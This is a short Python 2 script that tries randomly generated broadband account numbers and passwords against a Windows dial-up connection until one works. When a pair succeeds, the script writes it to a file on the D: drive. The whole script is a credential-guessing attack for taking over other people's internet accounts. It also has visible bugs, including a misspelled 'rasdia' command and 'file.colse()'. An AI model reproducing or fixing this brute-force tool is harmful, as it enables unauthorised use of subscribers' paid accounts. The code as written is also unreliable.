#!/usr/bin/env python

# -*- coding:utf-8 -*-

 

__author__ = 'laiyu'

 

import os

import random

import time

 

if __name__ == "__main__":

    not_found = 1

    while not_found:

        # 随机生成宽带帐号和密码

        username = str(random.randint(1000, 9999))

        passwd = str(random.randint(100, 999))

       

        # 宽带拨号

        cmd_str = "rasdia" + " " + "宽带连接" + " " + username + " " + passwd

        print cmd_str
        not_found = os.system(cmd_str)

        time.sleep(10)

       

        # 拨号成功，保存帐号密码

        if not_found == 0:

            file = open("d:\\test.txt", "w")

            file.write(username+ "" + passwd)

            file.colse()
